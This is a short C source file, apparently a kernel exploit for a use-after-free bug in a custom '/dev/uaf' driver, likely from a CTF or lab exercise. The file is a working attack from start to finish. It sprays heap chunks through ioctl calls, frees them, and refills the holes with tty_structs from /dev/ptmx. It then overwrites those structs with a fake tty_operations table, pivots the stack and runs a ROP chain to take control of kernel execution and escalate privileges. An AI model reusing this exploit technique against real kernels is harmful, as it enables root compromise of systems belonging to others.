#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<sys/ioctl.h>
#include "template.h"

//author : afang
//comment: what a nice day, isn't it?!

int main(int argc, char* argv[]){

	char *dev = "/dev/uaf";
	//char *buf = "I'm inside kernel.\n";
	int fd = open(dev, O_RDWR);

	int fd_lst[100];
	struct temp{
		size_t length;
		char *buf;
		size_t idx;
	}a1;
	a1.length = 0x2e0;
	a1.idx = 20;
	struct temp *test = &a1;

	//Step0: spray to make no gap between chunks.
	for(int i = 0; i < 40; i++){
		int fd = open(dev, O_RDWR);
		fd_lst[i] = fd;
		test->idx = i;
		printf("%d\n", i);
		ioctl(fd, 'd', test);
	}

	//Step1: free objects , create hole for tty_structs...
	for(int x = 20; x < 40; x++){
		test->idx = x;
		ioctl(fd_lst[x], 'c', test);
	}	

	int ptmx_fd_lst[1000];
	//Step2: spray ptmx objects, ready for usage. 
	for(int j = 0; j < 100; j++){
		ptmx_fd_lst[j] = open("/dev/ptmx", O_RDWR|O_NOCTTY);	
		if (ptmx_fd_lst[j]==-1){
			perror("open ptmx error...");
		}
	}

	//Now, assume objects allocated at our freed places are tty_structs.
	//Step3: overwrites them with dangling pointer inside fd_lst.
	test->idx = 20;
	test->length = 0x18;
	test->buf = (char*)malloc(0x20);
	ioctl(fd_lst[20], 'a', test);
	//print out tty_struct header for test...
	printf("%p %p\n", *(size_t*)(test->buf+8), *(size_t*)(test->buf+16));
	//overwrite 
	size_t temp_ptr = (size_t)(test->buf+0x18);
	prepare_fake_tty_operations(temp_ptr);
	for(int i = 20; i < 40; i++){
		test->idx = i;
		test->length = 0x20;
		ioctl(fd_lst[20], 'b', test);
	}
	
	//Step4: rsp will pointing to 0x8100008a here.
	//try to mmap to this place and put rop here.
	prepare_tf();
	kernel_rop_escalate(xchgeaxesp_addr & 0xffffffff);	
	
	printf("spray to get control of rip: \n");
	//Step5: trigger ops to control kernel rip...
	for(int i = 0; i < 100; i++){
		ioctl(ptmx_fd_lst[i], 0, 0);
	}
	return 0;
}
